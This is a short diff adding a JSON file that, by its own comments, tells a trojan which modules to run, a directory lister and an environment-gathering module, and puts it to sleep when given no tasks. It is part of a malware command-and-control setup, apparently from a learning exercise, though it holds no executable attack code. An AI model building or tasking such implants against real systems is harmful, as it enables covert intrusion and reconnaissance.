@@ -1,0 +1,11 @@
+[
+    {
+        "_comment": "Json obj in charge of telling the trojan what modules to use",
+        "module" : "dirlister.py"
+    },
+    {
+        "_comment": "Allows to give tasks and put to sleep by giving no tasks",
+        "module" : "environement.py"
+    }
+
+]
